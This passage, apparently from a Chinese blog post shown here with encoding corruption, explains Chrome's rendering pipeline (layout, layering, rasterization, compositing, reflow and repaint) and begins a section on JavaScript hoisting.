·å¼è¡¨ä¸­çš„å±æ€§å€¼ï¼Œä½¿å…¶æ ‡å‡†åŒ–</strong></p><p><img src="https://i.loli.net/2021/06/13/VmsIWR1Hybn7u9A.jpg" alt="Snipaste_2021-06-13_20-41-48.jpg"></p><p><strong>3. è®¡ç®—å‡º DOM æ ‘ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„å…·ä½“æ ·å¼</strong></p><p><strong>æ¶‰åŠåˆ° CSS çš„ç»§æ‰¿è§„åˆ™å’Œå±‚å è§„åˆ™ã€‚</strong></p><p>é¦–å…ˆæ˜¯ CSS ç»§æ‰¿ã€‚<strong>CSS ç»§æ‰¿å°±æ˜¯æ¯ä¸ª DOM èŠ‚ç‚¹éƒ½åŒ…å«æœ‰çˆ¶èŠ‚ç‚¹çš„æ ·å¼</strong>ã€‚</p><p><img src="https://i.loli.net/2021/06/13/YGTAELfPzvMa2Zp.jpg" alt="Snipaste_2021-06-13_20-43-10.jpg"></p><p>ç¬¬äºŒä¸ªè§„åˆ™æ˜¯æ ·å¼å±‚å ã€‚<strong>å±‚å æ˜¯ CSS çš„ä¸€ä¸ªåŸºæœ¬ç‰¹å¾ï¼Œå®ƒæ˜¯ä¸€ä¸ªå®šä¹‰äº†å¦‚ä½•åˆå¹¶æ¥è‡ªå¤šä¸ªæºçš„å±æ€§å€¼çš„ç®—æ³•ã€‚å®ƒåœ¨ CSS å¤„äºæ ¸å¿ƒåœ°ä½ï¼ŒCSS çš„å…¨ç§°â€œå±‚å æ ·å¼è¡¨â€æ­£æ˜¯å¼ºè°ƒäº†è¿™ä¸€ç‚¹</strong>ã€‚</p><h3 id="å¸ƒå±€é˜¶æ®µ"><a href="#å¸ƒå±€é˜¶æ®µ" class="headerlink" title="å¸ƒå±€é˜¶æ®µ"></a>å¸ƒå±€é˜¶æ®µ</h3><p>æ¥ä¸‹æ¥å°±éœ€è¦è®¡ç®—å‡º DOM æ ‘ä¸­å¯è§å…ƒç´ çš„å‡ ä½•ä½ç½®ï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªè®¡ç®—è¿‡ç¨‹å«åšå¸ƒå±€ã€‚</p><p>Chrome åœ¨å¸ƒå±€é˜¶æ®µéœ€è¦å®Œæˆä¸¤ä¸ªä»»åŠ¡ï¼šåˆ›å»ºå¸ƒå±€æ ‘å’Œå¸ƒå±€è®¡ç®—ã€‚</p><p><strong>1. åˆ›å»ºå¸ƒå±€æ ‘</strong></p><p>å¯èƒ½æ³¨æ„åˆ° DOM æ ‘è¿˜å«æœ‰å¾ˆå¤šä¸å¯è§çš„å…ƒç´ ï¼Œæ¯”å¦‚ head æ ‡ç­¾ï¼Œè¿˜æœ‰ä½¿ç”¨äº† display:none å±æ€§çš„å…ƒç´ ã€‚æ‰€ä»¥<strong>åœ¨æ˜¾ç¤ºä¹‹å‰ï¼Œæˆ‘ä»¬è¿˜è¦é¢å¤–åœ°æ„å»ºä¸€æ£µåªåŒ…å«å¯è§å…ƒç´ å¸ƒå±€æ ‘</strong>ã€‚</p><p>ç»“åˆä¸‹å›¾æ¥çœ‹çœ‹å¸ƒå±€æ ‘çš„æ„é€ è¿‡ç¨‹ï¼š</p><p><img src="https://i.loli.net/2021/06/13/gesREVjatk6wPN4.jpg" alt="Snipaste_2021-06-13_20-45-17.jpg"></p><p>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼ŒDOM æ ‘ä¸­æ‰€æœ‰ä¸å¯è§çš„èŠ‚ç‚¹éƒ½æ²¡æœ‰åŒ…å«åˆ°å¸ƒå±€æ ‘ä¸­ã€‚ä¸ºäº†æ„å»ºå¸ƒå±€æ ‘ï¼Œæµè§ˆå™¨å¤§ä½“ä¸Šå®Œæˆäº†ä¸‹é¢è¿™äº›å·¥ä½œï¼š</p><ul><li>éå† DOM æ ‘ä¸­çš„æ‰€æœ‰å¯è§èŠ‚ç‚¹ï¼Œå¹¶æŠŠè¿™äº›èŠ‚ç‚¹åŠ åˆ°å¸ƒå±€ä¸­ï¼›</li><li>è€Œä¸å¯è§çš„èŠ‚ç‚¹ä¼šè¢«å¸ƒå±€æ ‘å¿½ç•¥æ‰ï¼Œå¦‚ head æ ‡ç­¾ä¸‹é¢çš„å…¨éƒ¨å†…å®¹ï¼Œå†æ¯”å¦‚ body.p.span è¿™ä¸ªå…ƒç´ ï¼Œå› ä¸ºå®ƒçš„å±æ€§åŒ…å« dispaly:noneï¼Œæ‰€ä»¥è¿™ä¸ªå…ƒç´ ä¹Ÿæ²¡æœ‰è¢«åŒ…è¿›å¸ƒå±€æ ‘ã€‚</li></ul><p><strong>2. å¸ƒå±€è®¡ç®—</strong></p><h3 id="åˆ†å±‚"><a href="#åˆ†å±‚" class="headerlink" title="åˆ†å±‚"></a>åˆ†å±‚</h3><p>å› ä¸ºé¡µé¢ä¸­æœ‰å¾ˆå¤šå¤æ‚çš„æ•ˆæœï¼Œå¦‚ä¸€äº›å¤æ‚çš„ 3D å˜æ¢ã€é¡µé¢æ»šåŠ¨ï¼Œæˆ–è€…ä½¿ç”¨ z-indexing åš z è½´æ’åºç­‰ï¼Œä¸ºäº†æ›´åŠ æ–¹ä¾¿åœ°å®ç°è¿™äº›æ•ˆæœï¼Œ<strong>æ¸²æŸ“å¼•æ“è¿˜éœ€è¦ä¸ºç‰¹å®šçš„èŠ‚ç‚¹ç”Ÿæˆä¸“ç”¨çš„å›¾å±‚ï¼Œå¹¶ç”Ÿæˆä¸€æ£µå¯¹åº”çš„å›¾å±‚æ ‘</strong>ï¼ˆLayerTreeï¼‰ã€‚</p><p><strong>æµè§ˆå™¨çš„é¡µé¢å®é™…ä¸Šè¢«åˆ†æˆäº†å¾ˆå¤šå›¾å±‚ï¼Œè¿™äº›å›¾å±‚å åŠ ååˆæˆäº†æœ€ç»ˆçš„é¡µé¢</strong>ã€‚</p><p><img src="https://i.loli.net/2021/06/13/rMFSTGNwhkUxDHz.jpg" alt="Snipaste_2021-06-13_20-53-15.jpg"></p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œ<strong>å¹¶ä¸æ˜¯å¸ƒå±€æ ‘çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½åŒ…å«ä¸€ä¸ªå›¾å±‚ï¼Œå¦‚æœä¸€ä¸ªèŠ‚ç‚¹æ²¡æœ‰å¯¹åº”çš„å±‚ï¼Œé‚£ä¹ˆè¿™ä¸ªèŠ‚ç‚¹å°±ä»å±äºçˆ¶èŠ‚ç‚¹çš„å›¾å±‚</strong>ã€‚å¦‚ä¸Šå›¾ä¸­çš„ span æ ‡ç­¾æ²¡æœ‰ä¸“å±å›¾å±‚ï¼Œé‚£ä¹ˆå®ƒä»¬å°±ä»å±äºå®ƒä»¬çš„çˆ¶èŠ‚ç‚¹å›¾å±‚ã€‚ä½†ä¸ç®¡æ€æ ·ï¼Œæœ€ç»ˆæ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½ä¼šç›´æ¥æˆ–è€…é—´æ¥åœ°ä»å±äºä¸€ä¸ªå±‚ã€‚</p><p><strong>æ»¡è¶³ä¸‹é¢ä¸¤ç‚¹ä¸­ä»»æ„ä¸€ç‚¹çš„å…ƒç´ å°±å¯ä»¥è¢«æå‡ä¸ºå•ç‹¬çš„ä¸€ä¸ªå›¾å±‚ã€‚</strong></p><p><strong>ç¬¬ä¸€ç‚¹ï¼Œæ‹¥æœ‰å±‚å ä¸Šä¸‹æ–‡å±æ€§çš„å…ƒç´ ä¼šè¢«æå‡ä¸ºå•ç‹¬çš„ä¸€å±‚ã€‚</strong>é¡µé¢æ˜¯ä¸ªäºŒç»´å¹³é¢ï¼Œä½†æ˜¯å±‚å ä¸Šä¸‹æ–‡èƒ½å¤Ÿè®© HTML å…ƒç´ å…·æœ‰ä¸‰ç»´æ¦‚å¿µï¼Œè¿™äº› HTML å…ƒç´ æŒ‰ç…§è‡ªèº«å±æ€§çš„ä¼˜å…ˆçº§åˆ†å¸ƒåœ¨å‚ç›´äºè¿™ä¸ªäºŒç»´å¹³é¢çš„ z è½´ä¸Šã€‚<strong>æ˜ç¡®å®šä½å±æ€§çš„å…ƒç´ ã€å®šä¹‰é€æ˜å±æ€§çš„å…ƒç´ ã€ä½¿ç”¨ CSS æ»¤é•œçš„å…ƒç´ </strong>ç­‰ï¼Œéƒ½æ‹¥æœ‰å±‚å ä¸Šä¸‹æ–‡å±æ€§ã€‚</p><p><strong>ç¬¬äºŒç‚¹ï¼Œéœ€è¦å‰ªè£ï¼ˆclipï¼‰çš„åœ°æ–¹ä¹Ÿä¼šè¢«åˆ›å»ºä¸ºå›¾å±‚ã€‚</strong>ï¼ˆdivé™åˆ¶ï¼Œæ”¾ä¸ä¸‹äº†ï¼‰å‡ºç°è£å‰ªæƒ…å†µçš„æ—¶å€™ï¼Œæ¸²æŸ“å¼•æ“ä¼šä¸ºæ–‡å­—éƒ¨åˆ†å•ç‹¬åˆ›å»ºä¸€ä¸ªå±‚ï¼Œå¦‚æœå‡ºç°æ»šåŠ¨æ¡ï¼Œæ»šåŠ¨æ¡ä¹Ÿä¼šè¢«æå‡ä¸ºå•ç‹¬çš„å±‚ã€‚å¯ä»¥å‚è€ƒä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2021/06/13/8PVsfkMCbJwLpQF.jpg" alt="Snipaste_2021-06-13_20-55-26.jpg"></p><h3 id="å›¾å±‚ç»˜åˆ¶"><a href="#å›¾å±‚ç»˜åˆ¶" class="headerlink" title="å›¾å±‚ç»˜åˆ¶"></a>å›¾å±‚ç»˜åˆ¶</h3><p>å®Œæˆå›¾å±‚æ ‘çš„æ„å»ºä¹‹åï¼Œæ¸²æŸ“å¼•æ“ä¼šå¯¹å›¾å±‚æ ‘ä¸­çš„æ¯ä¸ªå›¾å±‚è¿›è¡Œç»˜åˆ¶ã€‚æ¸²æŸ“å¼•æ“ä¼šæŠŠä¸€ä¸ªå›¾å±‚çš„ç»˜åˆ¶æ‹†åˆ†æˆå¾ˆå¤šå°çš„<strong>ç»˜åˆ¶æŒ‡ä»¤</strong>ï¼Œç„¶åå†æŠŠè¿™äº›æŒ‡ä»¤æŒ‰ç…§é¡ºåºç»„æˆä¸€ä¸ªå¾…ç»˜åˆ¶åˆ—è¡¨ã€‚ç»˜åˆ¶åˆ—è¡¨ä¸­çš„æŒ‡ä»¤éå¸¸ç®€å•ï¼Œå› æ­¤ç»˜åˆ¶ä¸€ä¸ªå…ƒç´ é€šå¸¸éœ€è¦å¥½å‡ æ¡ç»˜åˆ¶æŒ‡ä»¤ï¼Œå› ä¸ºæ¯ä¸ªå…ƒç´ çš„èƒŒæ™¯ã€å‰æ™¯ã€è¾¹æ¡†éƒ½éœ€è¦å•ç‹¬çš„æŒ‡ä»¤å»ç»˜åˆ¶ã€‚</p><h3 id="æ …æ ¼åŒ–ï¼ˆrasterï¼‰æ“ä½œ"><a href="#æ …æ ¼åŒ–ï¼ˆrasterï¼‰æ“ä½œ" class="headerlink" title="æ …æ ¼åŒ–ï¼ˆrasterï¼‰æ“ä½œ"></a>æ …æ ¼åŒ–ï¼ˆrasterï¼‰æ“ä½œ</h3><p>ç»˜åˆ¶åˆ—è¡¨åªæ˜¯ç”¨æ¥è®°å½•ç»˜åˆ¶é¡ºåºå’Œç»˜åˆ¶æŒ‡ä»¤çš„åˆ—è¡¨ï¼Œè€Œå®é™…ä¸Šç»˜åˆ¶æ“ä½œæ˜¯ç”±æ¸²æŸ“å¼•æ“ä¸­çš„åˆæˆçº¿ç¨‹æ¥å®Œæˆçš„ã€‚å¯ä»¥ç»“åˆä¸‹å›¾æ¥çœ‹ä¸‹æ¸²æŸ“ä¸»çº¿ç¨‹å’Œåˆæˆçº¿ç¨‹ä¹‹é—´çš„å…³ç³»ï¼š</p><p><img src="https://i.loli.net/2021/06/13/CebMaRv9WpDYjxg.jpg" alt="Snipaste_2021-06-13_21-01-32.jpg"></p><p>å½“å›¾å±‚çš„ç»˜åˆ¶åˆ—è¡¨å‡†å¤‡å¥½ä¹‹åï¼Œä¸»çº¿ç¨‹ä¼šæŠŠè¯¥ç»˜åˆ¶åˆ—è¡¨<strong>æäº¤</strong>ç»™åˆæˆçº¿ç¨‹ã€‚é€šå¸¸ä¸€ä¸ªé¡µé¢å¯èƒ½å¾ˆå¤§ï¼Œä½†æ˜¯ç”¨æˆ·åªèƒ½çœ‹åˆ°å…¶ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬æŠŠç”¨æˆ·å¯ä»¥çœ‹åˆ°çš„è¿™ä¸ªéƒ¨åˆ†å«åš<strong>è§†å£</strong></p><p>åœ¨æœ‰äº›æƒ…å†µä¸‹ï¼Œæœ‰çš„å›¾å±‚å¯ä»¥å¾ˆå¤§ï¼Œæ¯”å¦‚æœ‰çš„é¡µé¢ä½ ä½¿ç”¨æ»šåŠ¨æ¡è¦æ»šåŠ¨å¥½ä¹…æ‰èƒ½æ»šåŠ¨åˆ°åº•éƒ¨ï¼Œä½†æ˜¯é€šè¿‡è§†å£ï¼Œç”¨æˆ·åªèƒ½çœ‹åˆ°é¡µé¢çš„å¾ˆå°ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¦ç»˜åˆ¶å‡ºæ‰€æœ‰å›¾å±‚å†…å®¹çš„è¯ï¼Œå°±ä¼šäº§ç”Ÿå¤ªå¤§çš„å¼€é”€ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰å¿…è¦ã€‚</p><p>åŸºäºè¿™ä¸ªåŸå› ï¼Œ<strong>åˆæˆçº¿ç¨‹ä¼šå°†å›¾å±‚åˆ’åˆ†ä¸ºå›¾å—ï¼ˆtileï¼‰</strong>ï¼Œè¿™äº›å›¾å—çš„å¤§å°é€šå¸¸æ˜¯ 256x256 æˆ–è€… 512x512ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/06/13/6y39hZ8vjKBFrVS.jpg" alt="Snipaste_2021-06-13_21-02-44.jpg"></p><p>ç„¶å<strong>åˆæˆçº¿ç¨‹ä¼šæŒ‰ç…§è§†å£é™„è¿‘çš„å›¾å—æ¥ä¼˜å…ˆç”Ÿæˆä½å›¾ï¼Œå®é™…ç”Ÿæˆä½å›¾çš„æ“ä½œæ˜¯ç”±æ …æ ¼åŒ–æ¥æ‰§è¡Œçš„ã€‚æ‰€è°“æ …æ ¼åŒ–ï¼Œæ˜¯æŒ‡å°†å›¾å—è½¬æ¢ä¸ºä½å›¾</strong>ã€‚è€Œå›¾å—æ˜¯æ …æ ¼åŒ–æ‰§è¡Œçš„æœ€å°å•ä½ã€‚æ¸²æŸ“è¿›ç¨‹ç»´æŠ¤äº†ä¸€ä¸ªæ …æ ¼åŒ–çš„çº¿ç¨‹æ± ï¼Œæ‰€æœ‰çš„å›¾å—æ …æ ¼åŒ–éƒ½æ˜¯åœ¨çº¿ç¨‹æ± å†…æ‰§è¡Œçš„ï¼Œè¿è¡Œæ–¹å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/06/13/F7UPtWLOjM4eQzI.jpg" alt="Snipaste_2021-06-13_21-08-02.jpg"></p><p>é€šå¸¸ï¼Œæ …æ ¼åŒ–è¿‡ç¨‹éƒ½ä¼šä½¿ç”¨ GPU æ¥åŠ é€Ÿç”Ÿæˆï¼Œä½¿ç”¨ GPU ç”Ÿæˆä½å›¾çš„è¿‡ç¨‹å«å¿«é€Ÿæ …æ ¼åŒ–ï¼Œæˆ–è€… GPU æ …æ ¼åŒ–ï¼Œç”Ÿæˆçš„ä½å›¾è¢«ä¿å­˜åœ¨ GPU å†…å­˜ä¸­ã€‚</p><h3 id="åˆæˆå’Œæ˜¾ç¤º"><a href="#åˆæˆå’Œæ˜¾ç¤º" class="headerlink" title="åˆæˆå’Œæ˜¾ç¤º"></a>åˆæˆå’Œæ˜¾ç¤º</h3><p>ä¸€æ—¦æ‰€æœ‰å›¾å—éƒ½è¢«å…‰æ …åŒ–ï¼Œåˆæˆçº¿ç¨‹å°±ä¼šç”Ÿæˆä¸€ä¸ªç»˜åˆ¶å›¾å—çš„å‘½ä»¤â€”â€”â€œDrawQuadâ€ï¼Œç„¶åå°†è¯¥å‘½ä»¤æäº¤ç»™æµè§ˆå™¨è¿›ç¨‹ã€‚</p><p>æµè§ˆå™¨è¿›ç¨‹é‡Œé¢æœ‰ä¸€ä¸ªå« viz çš„ç»„ä»¶ï¼Œç”¨æ¥æ¥æ”¶åˆæˆçº¿ç¨‹å‘è¿‡æ¥çš„ DrawQuad å‘½ä»¤ï¼Œç„¶åæ ¹æ® DrawQuad å‘½ä»¤ï¼Œå°†å…¶é¡µé¢å†…å®¹ç»˜åˆ¶åˆ°å†…å­˜ä¸­ï¼Œæœ€åå†å°†å†…å­˜æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚</p><h3 id="æ¸²æŸ“æµæ°´çº¿å¤§æ€»ç»“"><a href="#æ¸²æŸ“æµæ°´çº¿å¤§æ€»ç»“" class="headerlink" title="æ¸²æŸ“æµæ°´çº¿å¤§æ€»ç»“"></a>æ¸²æŸ“æµæ°´çº¿å¤§æ€»ç»“</h3><p><img src="https://i.loli.net/2021/06/13/f4ZzuGRy2SKVqbN.jpg" alt="Snipaste_2021-06-13_21-09-36.jpg"></p><p>ç»“åˆä¸Šå›¾ï¼Œä¸€ä¸ªå®Œæ•´çš„æ¸²æŸ“æµç¨‹å¤§è‡´å¯æ€»ç»“ä¸ºå¦‚ä¸‹ï¼š</p><ol><li>æ¸²æŸ“è¿›ç¨‹å°† HTML å†…å®¹è½¬æ¢ä¸ºèƒ½å¤Ÿè¯»æ‡‚çš„<strong>DOM æ ‘</strong>ç»“æ„ã€‚</li><li>æ¸²æŸ“å¼•æ“å°† CSS æ ·å¼è¡¨è½¬åŒ–ä¸ºæµè§ˆå™¨å¯ä»¥ç†è§£çš„<strong>styleSheets</strong>ï¼Œè®¡ç®—å‡º DOM èŠ‚ç‚¹çš„æ ·å¼ã€‚</li><li>åˆ›å»º<strong>å¸ƒå±€æ ‘</strong>ï¼Œå¹¶è®¡ç®—å…ƒç´ çš„å¸ƒå±€ä¿¡æ¯ã€‚</li><li>å¯¹å¸ƒå±€æ ‘è¿›è¡Œåˆ†å±‚ï¼Œå¹¶ç”Ÿæˆ<strong>åˆ†å±‚æ ‘</strong>ã€‚</li><li>ä¸ºæ¯ä¸ªå›¾å±‚ç”Ÿæˆ<strong>ç»˜åˆ¶åˆ—è¡¨</strong>ï¼Œå¹¶å°†å…¶æäº¤åˆ°åˆæˆçº¿ç¨‹ã€‚</li><li>åˆæˆçº¿ç¨‹å°†å›¾å±‚åˆ†æˆ<strong>å›¾å—</strong>ï¼Œå¹¶åœ¨<strong>å…‰æ …åŒ–çº¿ç¨‹æ± </strong>ä¸­å°†å›¾å—è½¬æ¢æˆä½å›¾ã€‚</li><li>åˆæˆçº¿ç¨‹å‘é€ç»˜åˆ¶å›¾å—å‘½ä»¤<strong>DrawQuad</strong>ç»™æµè§ˆå™¨è¿›ç¨‹ã€‚</li><li>æµè§ˆå™¨è¿›ç¨‹æ ¹æ® DrawQuad æ¶ˆæ¯<strong>ç”Ÿæˆé¡µé¢</strong>ï¼Œå¹¶<strong>æ˜¾ç¤º</strong>åˆ°æ˜¾ç¤ºå™¨ä¸Šã€‚</li></ol><h3 id="1-æ¦‚å¿µâ€”â€”é‡æ’ï¼ˆæ›´æ–°äº†å…ƒç´ çš„å‡ ä½•å±æ€§ï¼‰"><a href="#1-æ¦‚å¿µâ€”â€”é‡æ’ï¼ˆæ›´æ–°äº†å…ƒç´ çš„å‡ ä½•å±æ€§ï¼‰" class="headerlink" title="1. æ¦‚å¿µâ€”â€”é‡æ’ï¼ˆæ›´æ–°äº†å…ƒç´ çš„å‡ ä½•å±æ€§ï¼‰"></a>1. æ¦‚å¿µâ€”â€”é‡æ’ï¼ˆæ›´æ–°äº†å…ƒç´ çš„å‡ ä½•å±æ€§ï¼‰</h3><p><img src="https://i.loli.net/2021/06/13/Ni7Q8rkXM1P6sLb.jpg" alt="Snipaste_2021-06-13_21-10-59.jpg"></p><p>å¦‚æœé€šè¿‡ JavaScript æˆ–è€… CSS ä¿®æ”¹å…ƒç´ çš„å‡ ä½•ä½ç½®å±æ€§ï¼Œä¾‹å¦‚æ”¹å˜å…ƒç´ çš„å®½åº¦ã€é«˜åº¦ç­‰ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šè§¦å‘é‡æ–°å¸ƒå±€ï¼Œè§£æä¹‹åçš„ä¸€ç³»åˆ—å­é˜¶æ®µï¼Œè¿™ä¸ªè¿‡ç¨‹å°±å«<strong>é‡æ’</strong>ã€‚æ— ç–‘ï¼Œ<strong>é‡æ’éœ€è¦æ›´æ–°å®Œæ•´çš„æ¸²æŸ“æµæ°´çº¿ï¼Œæ‰€ä»¥å¼€é”€ä¹Ÿæ˜¯æœ€å¤§çš„</strong>ã€‚</p><h3 id="2-æ¦‚å¿µâ€”â€”é‡ç»˜ï¼ˆæ›´æ–°å…ƒç´ çš„ç»˜åˆ¶å±æ€§ï¼‰"><a href="#2-æ¦‚å¿µâ€”â€”é‡ç»˜ï¼ˆæ›´æ–°å…ƒç´ çš„ç»˜åˆ¶å±æ€§ï¼‰" class="headerlink" title="2. æ¦‚å¿µâ€”â€”é‡ç»˜ï¼ˆæ›´æ–°å…ƒç´ çš„ç»˜åˆ¶å±æ€§ï¼‰"></a>2. æ¦‚å¿µâ€”â€”é‡ç»˜ï¼ˆæ›´æ–°å…ƒç´ çš„ç»˜åˆ¶å±æ€§ï¼‰</h3><p><img src="https://i.loli.net/2021/06/13/Xd5g8YJPq3iVwv2.jpg" alt="Snipaste_2021-06-13_21-12-08.jpg"></p><p>ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼Œå¦‚æœä¿®æ”¹äº†å…ƒç´ çš„èƒŒæ™¯é¢œè‰²ï¼Œé‚£ä¹ˆå¸ƒå±€é˜¶æ®µå°†ä¸ä¼šè¢«æ‰§è¡Œï¼Œå› ä¸ºå¹¶æ²¡æœ‰å¼•èµ·å‡ ä½•ä½ç½®çš„å˜æ¢ï¼Œæ‰€ä»¥å°±ç›´æ¥è¿›å…¥äº†ç»˜åˆ¶é˜¶æ®µï¼Œç„¶åæ‰§è¡Œä¹‹åçš„ä¸€ç³»åˆ—å­é˜¶æ®µï¼Œè¿™ä¸ªè¿‡ç¨‹å°±å«<strong>é‡ç»˜</strong>ã€‚ç›¸è¾ƒäºé‡æ’æ“ä½œï¼Œ<strong>é‡ç»˜çœå»äº†å¸ƒå±€å’Œåˆ†å±‚é˜¶æ®µï¼Œæ‰€ä»¥æ‰§è¡Œæ•ˆç‡ä¼šæ¯”é‡æ’æ“ä½œè¦é«˜ä¸€äº›</strong>ã€‚</p><h3 id="3-æ¦‚å¿µâ€”â€”åˆæˆ"><a href="#3-æ¦‚å¿µâ€”â€”åˆæˆ" class="headerlink" title="3. æ¦‚å¿µâ€”â€”åˆæˆ"></a>3. æ¦‚å¿µâ€”â€”åˆæˆ</h3><p>å¦‚æœæ›´æ”¹ä¸€ä¸ªæ—¢ä¸è¦å¸ƒå±€ä¹Ÿä¸è¦ç»˜åˆ¶çš„å±æ€§ï¼Œæ¸²æŸ“å¼•æ“å°†è·³è¿‡å¸ƒå±€å’Œç»˜åˆ¶ï¼Œåªæ‰§è¡Œåç»­çš„åˆæˆæ“ä½œï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªè¿‡ç¨‹å«åš<strong>åˆæˆ</strong>ã€‚</p><p><img src="https://i.loli.net/2021/06/13/riV1bC6JFjwvLZK.jpg" alt="Snipaste_2021-06-13_21-13-06.jpg"></p><p>ä½¿ç”¨ CSS çš„ transform æ¥å®ç°åŠ¨ç”»æ•ˆæœï¼Œè¿™å¯ä»¥é¿å¼€é‡æ’å’Œé‡ç»˜é˜¶æ®µï¼Œç›´æ¥åœ¨éä¸»çº¿ç¨‹ä¸Šæ‰§è¡ŒåˆæˆåŠ¨ç”»æ“ä½œã€‚è¿™æ ·çš„æ•ˆç‡æ˜¯æœ€é«˜çš„ï¼Œå› ä¸ºæ˜¯åœ¨éä¸»çº¿ç¨‹ä¸Šåˆæˆï¼Œå¹¶æ²¡æœ‰å ç”¨ä¸»çº¿ç¨‹çš„èµ„æºï¼Œå¦å¤–ä¹Ÿé¿å¼€äº†å¸ƒå±€å’Œç»˜åˆ¶ä¸¤ä¸ªå­é˜¶æ®µï¼Œæ‰€ä»¥<strong>ç›¸å¯¹äºé‡ç»˜å’Œé‡æ’ï¼Œåˆæˆèƒ½å¤§å¤§æå‡ç»˜åˆ¶æ•ˆç‡</strong>ã€‚</p><hr><h1 id="æµè§ˆå™¨ä¸­çš„JavaScriptæ‰§è¡Œæœºåˆ¶"><a href="#æµè§ˆå™¨ä¸­çš„JavaScriptæ‰§è¡Œæœºåˆ¶" class="headerlink" title="æµè§ˆå™¨ä¸­çš„JavaScriptæ‰§è¡Œæœºåˆ¶"></a>æµè§ˆå™¨ä¸­çš„JavaScriptæ‰§è¡Œæœºåˆ¶</h1><h2 id="æ‰§è¡Œä¸Šä¸‹æ–‡"><a href="#æ‰§è¡Œä¸Šä¸‹æ–‡" class="headerlink" title="æ‰§è¡Œä¸Šä¸‹æ–‡"></a><strong>æ‰§è¡Œä¸Šä¸‹æ–‡</strong></h2><ol><li>åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œè‹¥ä½¿ç”¨äº†æœªå£°æ˜çš„å˜é‡ï¼Œé‚£ä¹ˆ JavaScript æ‰§è¡Œä¼šæŠ¥é”™ã€‚</li><li>åœ¨ä¸€ä¸ªå˜é‡å®šä¹‰ä¹‹å‰ä½¿ç”¨å®ƒï¼Œä¸ä¼šå‡ºé”™ï¼Œä½†æ˜¯è¯¥å˜é‡çš„å€¼ä¼šä¸º undefinedï¼Œè€Œä¸æ˜¯å®šä¹‰æ—¶çš„å€¼ã€‚</li><li>åœ¨ä¸€ä¸ªå‡½æ•°å®šä¹‰ä¹‹å‰ä½¿ç”¨å®ƒï¼Œä¸ä¼šå‡ºé”™ï¼Œä¸”å‡½æ•°èƒ½æ­£ç¡®æ‰§è¡Œã€‚</li></ol><h2 id="å˜é‡æå‡ï¼ˆHoistingï¼‰"><a href="#å˜é‡æå‡ï¼ˆHoistingï¼‰" class="headerlink" title="å˜é‡æå‡ï¼ˆHoistingï¼‰"></a>å˜é‡æå‡ï¼ˆHoistingï¼‰</h2><p><img src="https://i.loli.net/2021/06/13/gQsNIO3vzcDpZSq.jpg" alt="Snipaste_2021-06-13_21-35-36.jpg"></p><p>ä¸Šé¢æ˜¯<strong>å˜é‡</strong>çš„å£°æ˜å’Œèµ‹å€¼ï¼Œä¸‹é¢æ˜¯<strong>å‡½æ•°</strong>çš„å£°æ˜å’Œèµ‹å€¼</p><p><img src="https://i.loli.net/2021/06/13/TBXObM38ZhgsrlV.jpg" alt="Snipaste_2021-06-13_21-36-23.jpg"></p><p>æ‰€è°“çš„<strong>å˜é‡æå‡</strong>ï¼Œæ˜¯æŒ‡åœ¨ JavaScript ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼ŒJavaScript å¼•æ“æŠŠå˜é‡çš„å£°æ˜éƒ¨åˆ†å’Œå‡½æ•°çš„å£°æ˜éƒ¨åˆ†æå‡åˆ°ä»£ç å¼€å¤´çš„â€œè¡Œä¸ºâ€ã€‚å˜é‡è¢«æå‡åï¼Œä¼šç»™å˜é‡è®¾ç½®é»˜è®¤å€¼ï¼Œè¿™ä¸ªé»˜è®¤å€¼å°±æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„ undefinedã€‚</p><h2 id="JavaScript-ä»£ç çš„æ‰§è¡Œæµç¨‹"><a href="#JavaScript-ä»£ç çš„æ‰§è¡Œæµç¨‹" class="headerlink" title="JavaScript ä»£ç çš„æ‰§è¡Œæµç¨‹"></a>JavaScript ä»£ç çš„æ‰§è¡Œæµç¨‹</h2><p>ä»æ¦‚å¿µçš„å­—é¢æ„ä¹‰ä¸Šæ¥çœ‹ï¼Œâ€œå˜é‡æå‡â€æ„å‘³ç€å˜é‡å’Œå‡½æ•°çš„å£°æ˜ä¼šåœ¨ç‰©ç†å±‚é¢ç§»åŠ¨åˆ°ä»£ç çš„æœ€å‰é¢ã€‚ä½†<strong>å®é™…ä¸Šå˜é‡å’Œå‡½æ•°å£°æ˜åœ¨ä»£ç é‡Œçš„ä½ç½®æ˜¯ä¸ä¼šæ”¹å˜çš„ï¼Œè€Œæ˜¯åœ¨ç¼–è¯‘é˜¶æ®µè¢« JavaScript å¼•æ“æ”¾å…¥å†…å­˜ä¸­</strong>ã€‚ä¸€æ®µ JavaScript ä»£ç åœ¨æ‰§è¡Œä¹‹å‰éœ€è¦è¢« JavaScript å¼•æ“ç¼–è¯‘ï¼Œ<strong>ç¼–è¯‘</strong>å®Œæˆä¹‹åï¼Œæ‰ä¼šè¿›å…¥<strong>æ‰§è¡Œ</strong>é˜¶æ®µã€‚</p><p><img src="https://i.loli.net/2021/06/13/tGEw7LNHFIBqYcb.jpg" alt="Snipaste_2021-06-13_21-38-29.jpg"></p><h3 id="1-ç¼–è¯‘é˜¶æ®µ"><a href="#1-ç¼–è¯‘é˜¶æ®µ" class="headerlink" title="1. ç¼–è¯‘é˜¶æ®µ"></a><strong>1. ç¼–è¯‘é˜¶æ®µ</strong></h3><p><img src="https://i.loli.net/2021/06/13/bIClNV2394fLiXB.jpg" alt="Snipaste_2021-06-13_21-39-32.jpg"></p><p>è¾“å…¥ä¸€æ®µä»£ç 